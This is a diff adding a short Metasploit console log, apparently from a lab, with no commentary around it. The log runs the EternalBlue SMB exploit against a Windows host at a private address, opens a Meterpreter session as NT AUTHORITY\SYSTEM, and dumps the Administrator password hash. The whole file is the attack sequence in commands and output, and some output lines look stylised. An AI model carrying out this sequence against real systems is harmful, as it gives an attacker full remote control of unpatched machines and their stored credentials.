@@ -1,0 +1,14 @@
+[*] Starting Metasploit Framework...
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > set RHOST 192.168.56.10
+RHOST => 192.168.56.10
+msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(ms17_010_eternalblue) > run
+[*] Exploit sent successfully!
+[+] Meterpreter session 1 opened!
+meterpreter > getuid
+Server username: NT AUTHORITY\\SYSTEM
+meterpreter > hashdump
+[*] Dumping password hashes...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
